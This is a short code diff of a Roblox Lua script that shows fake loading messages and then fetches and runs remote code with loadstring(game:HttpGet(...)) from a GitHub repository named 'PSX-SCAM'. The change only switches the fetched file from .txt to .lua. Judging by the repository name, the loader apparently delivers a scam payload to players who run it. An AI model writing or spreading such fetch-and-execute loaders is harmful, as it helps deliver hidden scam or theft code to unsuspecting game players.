@@ -5,4 +5,4 @@ _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script"
 _G.Text3 = "Checking Scripts..."
 _G.Text4 = "Starting Scripts..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/PSX-SCAM/main/PSX-SCAM-SOURCE.txt"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/PSX-SCAM/main/PSX-SCAM-SOURCE.lua"))()
